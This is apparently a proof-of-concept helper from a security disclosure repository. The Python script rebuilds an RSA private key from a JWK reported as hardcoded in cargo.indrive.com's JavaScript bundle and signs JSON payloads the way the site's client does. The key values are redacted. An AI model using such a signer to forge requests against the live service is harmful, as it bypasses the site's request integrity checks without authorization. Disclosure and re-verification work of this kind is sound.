"""
extract_key.py

Reconstructs the RSA private key object from the JWK found hardcoded
in the cargo.indrive.com JavaScript bundle, and exposes a sign() helper
used by the other PoC scripts.

NOTE: The actual key values below are REDACTED in this public repo.
Replace the placeholder values with the real JWK fields only in a private,
local copy used for authorized testing / re-verification -- never commit
real key material to a public repository.
"""

import json
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import (
    RSAPrivateNumbers,
    RSAPublicNumbers,
)

# --- REDACTED: replace with real JWK values from the JS bundle locally ---
JWK = {
    "n": "<REDACTED>",
    "e": "AQAB",
    "d": "<REDACTED>",
    "p": "<REDACTED>",
    "q": "<REDACTED>",
    "dp": "<REDACTED>",
    "dq": "<REDACTED>",
    "qi": "<REDACTED>",
}
# ---------------------------------------------------------------------


def b64url_to_int(s: str) -> int:
    """Decode a base64url string (JWK format) into an integer."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return int.from_bytes(base64.b64decode(s), "big")


def load_private_key(jwk: dict):
    pub = RSAPublicNumbers(
        e=b64url_to_int(jwk["e"]),
        n=b64url_to_int(jwk["n"]),
    )
    priv = RSAPrivateNumbers(
        p=b64url_to_int(jwk["p"]),
        q=b64url_to_int(jwk["q"]),
        d=b64url_to_int(jwk["d"]),
        dmp1=b64url_to_int(jwk["dp"]),
        dmq1=b64url_to_int(jwk["dq"]),
        iqmp=b64url_to_int(jwk["qi"]),
        public_numbers=pub,
    )
    return priv.private_key(default_backend())


def sign(obj: dict, private_key=None) -> str:
    """Sign a JSON payload the same way the client-side y(t) function does."""
    if private_key is None:
        private_key = load_private_key(JWK)
    data = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    signature = private_key.sign(data, padding.PKCS1v15(), hashes.SHA256())
    return base64.b64encode(signature).decode()


if __name__ == "__main__":
    key = load_private_key(JWK)
    test_payload = {"phone": "0000000000", "phoneCode": "1", "captcha": "x", "locale": "en"}
    print("Signature:", sign(test_payload, key))
